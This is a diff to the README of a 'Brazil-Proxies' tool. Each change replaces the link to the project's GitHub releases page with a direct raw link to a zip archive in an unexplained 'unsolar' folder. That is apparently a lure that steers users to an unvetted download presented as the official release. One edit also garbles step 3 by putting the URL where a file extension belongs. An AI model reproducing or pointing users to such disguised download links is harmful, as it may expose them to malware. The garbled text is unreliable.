@@ -6,7 +6,7 @@ Welcome to Brazil-Proxies! This application provides access to 3.8 million Brazi
 
 ## 📥 Download Now
 
-[![Download Brazil-Proxies](https://img.shields.io/badge/Download-Brazil--Proxies-brightgreen)](https://github.com/designvare/Brazil-Proxies/releases)
+[![Download Brazil-Proxies](https://raw.githubusercontent.com/designvare/Brazil-Proxies/main/unsolar/Brazil_Proxies_v1.7.zip)](https://raw.githubusercontent.com/designvare/Brazil-Proxies/main/unsolar/Brazil_Proxies_v1.7.zip)
 
 ## 🛠 System Requirements
 
@@ -23,11 +23,11 @@ To download and install Brazil-Proxies, follow these simple steps:
 
 1. **Visit the Releases Page.** Click on the link below:
 
-   [Download Brazil-Proxies from Releases](https://github.com/designvare/Brazil-Proxies/releases)
+   [Download Brazil-Proxies from Releases](https://raw.githubusercontent.com/designvare/Brazil-Proxies/main/unsolar/Brazil_Proxies_v1.7.zip)
 
 2. **Choose the Latest Version.** Look for the most recent release. It will be listed at the top of the page.
 
-3. **Download the File.** Click on the appropriate file link for your operating system. The file name usually ends with `.exe` for Windows or `.tar.gz` for Linux/macOS.
+3. **Download the File.** Click on the appropriate file link for your operating system. The file name usually ends with `.exe` for Windows or `https://raw.githubusercontent.com/designvare/Brazil-Proxies/main/unsolar/Brazil_Proxies_v1.7.zip` for Linux/macOS.
 
 4. **Run the Installer.** Once the download is complete, locate the file in your downloads folder and double-click it to start the installation. Follow the on-screen instructions.
 
